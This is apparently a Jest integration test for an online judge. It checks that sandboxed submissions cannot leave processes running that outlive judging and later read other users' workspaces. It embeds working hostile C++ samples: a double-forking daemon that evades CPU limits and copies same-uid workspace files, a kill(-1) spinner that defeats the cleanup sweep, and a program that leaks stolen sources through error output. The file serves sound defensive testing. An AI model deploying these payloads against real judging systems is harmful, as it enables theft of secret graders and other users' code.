import { randomUUID } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import pg from 'pg';
import * as db from '../../db';
import { runMigrationsFromPool } from '../../scripts/migrate';
import { processSubmission } from '../../services/submissionService';
import { JUDGE_CONFIG, SUBMISSION_STATUS } from '../../constants';

jest.unmock('pg');
jest.mock('../../db', () => ({ query: jest.fn(), pool: { connect: jest.fn() }, withTransaction: jest.fn() }));

// A4-02 / A8-01 / A9-01: no process of a submission may outlive that
// submission's judge pipeline. Sandbox uids come back every
// SANDBOX_UID_POOL_SIZE pipelines, and file ownership by that uid is the only
// thing keeping one submission's workspace (source, header-problem grader
// files, binary) private from another — so a leftover process is a standing
// read/tamper handle on every later submission that draws the same uid.
//
// Drives the REAL judge pipeline (compile, sandbox, time_wrapper, seccomp),
// so it needs the backend image: linux, root, the compiled wrapper in cwd.
// Run it in a container with the production capability set
// (cap_drop ALL + SETUID/SETGID): without CAP_KILL even a plain sleeping TLE
// survives, which a default-caps container hides. Run it --runInBand: any
// live process on a pool uid counts as a leak, and the hygiene below kills
// every pool uid.
const gateConditions: Array<[string, boolean]> = [
  ['INTEGRATION_DATABASE_URL is set', Boolean(process.env.INTEGRATION_DATABASE_URL)],
  ['platform is linux', process.platform === 'linux'],
  ['running as uid 0', process.getuid?.() === 0],
  ['scripts/time_wrapper exists in cwd', fs.existsSync('scripts/time_wrapper')],
];
const unmet = gateConditions.filter(([, ok]) => !ok).map(([name]) => name);
if (process.env.JUDGE_RUNTIME_REQUIRED === '1' && unmet.length > 0) {
  throw new Error(`judge runtime suite is required (JUDGE_RUNTIME_REQUIRED=1) but unmet conditions: ${unmet.join('; ')}`);
}
const enabled = unmet.length === 0;

const POOL_UIDS = Array.from(
  { length: JUDGE_CONFIG.SANDBOX_UID_POOL_SIZE },
  (_, i) => JUDGE_CONFIG.SANDBOX_UID_BASE + i,
);

interface PoolProcess { pid: number; uid: number; cmd: string }

/** Live (non-zombie) processes whose real uid is a sandbox pool uid. */
function livePoolProcesses(): PoolProcess[] {
  const found: PoolProcess[] = [];
  for (const entry of fs.readdirSync('/proc')) {
    if (!/^\d+$/.test(entry)) continue;
    try {
      const status = fs.readFileSync(`/proc/${entry}/status`, 'utf8');
      const uid = Number(/^Uid:\s+(\d+)/m.exec(status)?.[1]);
      const state = /^State:\s+(\S)/m.exec(status)?.[1];
      if (!POOL_UIDS.includes(uid) || state === 'Z') continue;
      const cmd = fs.readFileSync(`/proc/${entry}/cmdline`, 'utf8').replaceAll('\0', ' ').trim();
      found.push({ pid: Number(entry), uid, cmd });
    } catch {
      // Exited while we looked.
    }
  }
  return found;
}

/**
 * Test hygiene only: SIGKILL every process of every pool uid. Root in the
 * production container has no CAP_KILL, so the kill is sent from the uid's
 * side: the judge's own sweep helper (`time_wrapper --kill-uid`, which a
 * spinning kill(-1) cannot stop), then a plain kill(-1) AS the uid as a
 * fallback for a wrapper that lacks the sweep mode.
 */
function killPoolProcesses(): void {
  for (const uid of POOL_UIDS) {
    const sweeper = JUDGE_CONFIG.SANDBOX_SWEEPER_UID_BASE + (uid - JUDGE_CONFIG.SANDBOX_UID_BASE);
    spawnSync(path.resolve('scripts/time_wrapper'), ['--kill-uid', String(uid), String(sweeper)], {
      stdio: 'ignore', timeout: 10_000,
    });
    spawnSync('/usr/bin/python3', ['-c', 'import os\ntry:\n    os.kill(-1, 9)\nexcept ProcessLookupError:\n    pass\n'], {
      uid, gid: uid, stdio: 'ignore', timeout: 5000,
    });
  }
}

const GRADER_MARKER = 'LIFETIME_GRADER_SECRET_MARKER';
const VICTIM_MARKER = 'LIFETIME_VICTIM_SOURCE_MARKER';

const GRADER_MAIN = `// ${GRADER_MARKER}: the reference solution's notes.
#include <iostream>
#include "student.h"
int main() { long long n; std::cin >> n; std::cout << twice(n) << "\\n"; return 0; }
`;
const VICTIM_HEADER = `// ${VICTIM_MARKER}
inline long long twice(long long n) { return n * 2; }
`;

/** Plain sleeper: Time Limit Exceeded. */
const SLEEPER = '#include <unistd.h>\nint main(){ sleep(100000); return 0; }';

/**
 * Prints the right answer, then keeps running in the background: as a
 * setsid'd, stdio-closed grandchild when fork/setsid are allowed, otherwise
 * as the program itself (which then simply outlives its TLE). With `loot`
 * set, it copies every regular file in the workspace of any later process
 * that shares its uid into `loot` (world-readable), and re-forks now and then
 * (when it can) so the per-process RLIMIT_CPU never catches it.
 */
function daemonSource(loot: string | null): string {
  return `#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <dirent.h>
#include <fcntl.h>
#include <iostream>
#include <sys/stat.h>
#include <unistd.h>
static void copyFile(const char* src, const char* dst) {
  int in = open(src, O_RDONLY); if (in < 0) return;
  int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644); if (out < 0) { close(in); return; }
  char buf[8192]; ssize_t n; while ((n = read(in, buf, sizeof buf)) > 0) { if (write(out, buf, n) < 0) break; }
  fchmod(out, 0644); close(in); close(out);
}
int main() {
  long long n; std::cin >> n; std::cout << n * 2 << std::endl;
  pid_t child = fork();
  if (child > 0) return 0;
  if (child == 0) { setsid(); if (fork() > 0) _exit(0); }
  int fd = open("/dev/null", O_RDWR); dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
  const char* loot = ${loot ? JSON.stringify(loot) : 'nullptr'};
  uid_t me = getuid();
  for (int iter = 0; iter < 90000; iter++) {
    if (iter % 2000 == 1999) { pid_t next = fork(); if (next > 0) _exit(0); }
    if (loot) {
      DIR* proc = opendir("/proc"); struct dirent* e;
      while (proc && (e = readdir(proc))) {
        int pid = atoi(e->d_name); if (pid <= 0 || pid == getpid()) continue;
        char p[512]; struct stat st; snprintf(p, sizeof p, "/proc/%d", pid);
        if (stat(p, &st) != 0 || st.st_uid != me) continue;
        char cwd[4096]; snprintf(p, sizeof p, "/proc/%d/cwd", pid);
        ssize_t len = readlink(p, cwd, sizeof cwd - 1); if (len <= 0) continue; cwd[len] = 0;
        if (!strstr(cwd, "oj-submissions")) continue;
        DIR* w = opendir(p); struct dirent* f;
        while (w && (f = readdir(w))) {
          if (f->d_name[0] == '.') continue;
          char src[8192], dst[8192]; struct stat fs2;
          snprintf(src, sizeof src, "%s/%s", p, f->d_name);
          if (stat(src, &fs2) != 0 || !S_ISREG(fs2.st_mode) || fs2.st_size > (1 << 20)) continue;
          snprintf(dst, sizeof dst, "%s/%d_%s", loot, pid, f->d_name);
          copyFile(src, dst);
        }
        if (w) closedir(w);
      }
      if (proc) closedir(proc);
    }
    usleep(1000);
  }
  _exit(0);
}
`;
}

/**
 * Prints the right answer and exits. Its setsid'd, stdio-closed grandchild
 * waits until the program has been reaped, then spins kill(-1, SIGKILL) in
 * several threads for about 3 s, re-forking every 0.15 s so the per-process
 * RLIMIT_CPU never fires, and then sleeps. While it spins, any other process
 * of its uid dies the moment it exists: a sweep helper that had become the
 * uid was killed every time, so the sweep failed (System Error, uid
 * quarantined) and the daemon stayed (review of the A4-02 fix).
 */
const SWEEP_SPINNER = `#include <cstdio>
#include <fcntl.h>
#include <iostream>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
static double until_t;
static double now() { timespec t; clock_gettime(CLOCK_MONOTONIC, &t); return t.tv_sec + t.tv_nsec / 1e9; }
static void* spin(void*) { while (now() < until_t) kill(-1, SIGKILL); return nullptr; }
int main() {
  long long n; std::cin >> n; std::cout << n * 2 << std::endl;
  pid_t program = getpid();
  pid_t child = fork();
  if (child != 0) return 0;
  setsid();
  if (fork() > 0) _exit(0);
  int fd = open("/dev/null", O_RDWR); dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
  while (kill(program, 0) == 0) usleep(200);
  for (int generation = 0; generation < 20; generation++) {
    until_t = now() + 0.15;
    pthread_t threads[5];
    for (pthread_t& t : threads) pthread_create(&t, nullptr, spin, nullptr);
    spin(nullptr);
    for (pthread_t& t : threads) pthread_join(t, nullptr);
    if (fork() > 0) _exit(0);
  }
  for (;;) sleep(1);
}
`;
const SWEEP_SPINNER_SUBMISSIONS = 6;

/** Dumps the stolen sources in `loot` to stderr and fails: the Runtime Error output. */
function exfilSource(loot: string): string {
  return `#include <cstdio>
#include <cstring>
#include <dirent.h>
int main() {
  DIR* d = opendir(${JSON.stringify(loot)}); if (!d) return 1;
  struct dirent* e; char p[8192];
  while ((e = readdir(d))) {
    size_t len = strlen(e->d_name);
    bool source = (len > 4 && !strcmp(e->d_name + len - 4, ".cpp")) || (len > 2 && !strcmp(e->d_name + len - 2, ".h"));
    if (e->d_name[0] == '.' || !source) continue;
    snprintf(p, sizeof p, "%s/%s", ${JSON.stringify(loot)}, e->d_name);
    if (FILE* f = fopen(p, "r")) { int c; while ((c = fgetc(f)) != EOF) fputc(c, stderr); fclose(f); }
  }
  closedir(d);
  return 1;
}
`;
}

(enabled ? describe : describe.skip)('sandbox processes do not outlive their submission', () => {
  jest.setTimeout(90_000);
  const schema = `lifetime_${randomUUID().replaceAll('-', '')}`;
  const admin = new pg.Pool({ connectionString: process.env.INTEGRATION_DATABASE_URL });
  const pool = new pg.Pool({ connectionString: process.env.INTEGRATION_DATABASE_URL, options: `-c search_path=${schema}` });
  let userId: number;
  let lootDir = '';

  beforeAll(async () => {
    killPoolProcesses();
    await admin.query(`CREATE SCHEMA ${schema}`);
    await runMigrationsFromPool(pool);
    (db.query as jest.Mock).mockImplementation((sql, values) => pool.query(sql, values));
    (db.pool.connect as jest.Mock).mockImplementation(() => pool.connect());
    (db.withTransaction as jest.Mock).mockImplementation(async (body: (client: pg.PoolClient) => Promise<unknown>) => {
      const client = await pool.connect();
      try {
        await client.query('BEGIN');
        const result = await body(client);
        await client.query('COMMIT');
        return result;
      } catch (error) {
        await client.query('ROLLBACK');
        throw error;
      } finally {
        client.release();
      }
    });
    userId = (await pool.query(
      `INSERT INTO users (username, password_hash, role) VALUES ('lifetime-tester', 'x', 'user') RETURNING id`,
    )).rows[0].id;
    await pool.query(
      `INSERT INTO problems (id, title, time_limit_ms, memory_limit_mb, is_visible) VALUES ('double', 'double', 1000, 256, true)`,
    );
    await pool.query(
      `INSERT INTO testcases (problem_id, case_number, input_data, output_data) VALUES ('double', 1, '3\n', '6\n')`,
    );
    await pool.query(
      `INSERT INTO problems (id, title, time_limit_ms, memory_limit_mb, is_visible, problem_type, submission_filename)
       VALUES ('hsecret', 'hsecret', 1000, 256, true, 'header', 'student.h')`,
    );
    await pool.query(
      `INSERT INTO testcases (problem_id, case_number, input_data, output_data) VALUES ('hsecret', 1, '3\n', '6\n')`,
    );
    await pool.query(
      `INSERT INTO problem_files (problem_id, role, filename, content) VALUES ('hsecret', 'grader', 'main.cpp', $1)`,
      [Buffer.from(GRADER_MAIN, 'utf-8')],
    );
  });

  beforeEach(() => {
    // Root-owned sticky world-writable drop box (root can still empty it
    // without CAP_FOWNER because it owns the directory).
    lootDir = fs.mkdtempSync('/tmp/lifetime-loot-');
    fs.chmodSync(lootDir, 0o1777);
  });

  afterEach(() => {
    killPoolProcesses();
    if (lootDir) fs.rmSync(lootDir, { recursive: true, force: true });
  });

  afterAll(async () => {
    killPoolProcesses();
    await pool.end();
    await admin.query(`DROP SCHEMA ${schema} CASCADE`);
    await admin.end();
  });

  async function judgeOnce(problemId: string, code: string) {
    const inserted = await pool.query(
      `INSERT INTO submissions (user_id, problem_id, code, language, overall_status, score)
       VALUES ($1, $2, $3, 'cpp', $4, 0) RETURNING id`,
      [userId, problemId, code, SUBMISSION_STATUS.PENDING],
    );
    const id = inserted.rows[0].id as number;
    await processSubmission(id);
    return (await pool.query('SELECT overall_status, results FROM submissions WHERE id = $1', [id])).rows[0];
  }

  it('a sleeping program judged TLE is gone once its submission is judged', async () => {
    const row = await judgeOnce('double', SLEEPER);
    expect(row.overall_status).toBe(SUBMISSION_STATUS.TIME_LIMIT_EXCEEDED);
    expect(livePoolProcesses()).toEqual([]);
  });

  it('a backgrounded (setsid, stdio-closed) process is gone once its submission is judged', async () => {
    await judgeOnce('double', daemonSource(null));
    expect(livePoolProcesses()).toEqual([]);
  });

  it('a daemon spinning kill(-1, SIGKILL) cannot stop the sweep: every verdict lands and nothing survives', async () => {
    const outcomes: Array<{ status: string; survivors: PoolProcess[] }> = [];
    for (let i = 0; i < SWEEP_SPINNER_SUBMISSIONS; i++) {
      const row = await judgeOnce('double', SWEEP_SPINNER);
      outcomes.push({ status: row.overall_status, survivors: livePoolProcesses() });
    }
    // The program's answer is right, so each verdict is Accepted, not System
    // Error from a sweep the daemon killed, and no daemon outlives its submission.
    expect(outcomes).toEqual(Array.from({ length: SWEEP_SPINNER_SUBMISSIONS }, () => ({
      status: SUBMISSION_STATUS.ACCEPTED, survivors: [],
    })));
    // The pool still serves everyone afterwards.
    const after = await judgeOnce('double', '#include <iostream>\nint main(){ long long n; std::cin >> n; std::cout << n * 2 << "\\n"; }');
    expect(after.overall_status).toBe(SUBMISSION_STATUS.ACCEPTED);
  });

  it('a later submission that draws the same sandbox uid cannot have its sources or grader read', async () => {
    // Attacker: plants the harvesting daemon on its uid.
    await judgeOnce('double', daemonSource(lootDir));
    // Anyone's submissions advance the round-robin back to that uid.
    for (let i = 0; i < JUDGE_CONFIG.SANDBOX_UID_POOL_SIZE - 1; i++) {
      await judgeOnce('double', 'int main( {');
    }
    // Victim: a header-problem submission (student.h + the SECRET grader).
    const victim = await judgeOnce('hsecret', VICTIM_HEADER);
    expect(victim.overall_status).toBe(SUBMISSION_STATUS.ACCEPTED);

    const stolen = fs.readdirSync(lootDir)
      .map((name) => fs.readFileSync(path.join(lootDir, name), 'utf8'))
      .join('\n');
    // ...and the attacker's next submission cannot print it as Runtime Error output.
    const exfil = await judgeOnce('double', exfilSource(lootDir));
    const shown = JSON.stringify(exfil.results ?? []);
    expect({
      graderInDropBox: stolen.includes(GRADER_MARKER),
      victimSourceInDropBox: stolen.includes(VICTIM_MARKER),
      graderShownToAttacker: shown.includes(GRADER_MARKER),
      victimSourceShownToAttacker: shown.includes(VICTIM_MARKER),
    }).toEqual({
      graderInDropBox: false,
      victimSourceInDropBox: false,
      graderShownToAttacker: false,
      victimSourceShownToAttacker: false,
    });
  });
});
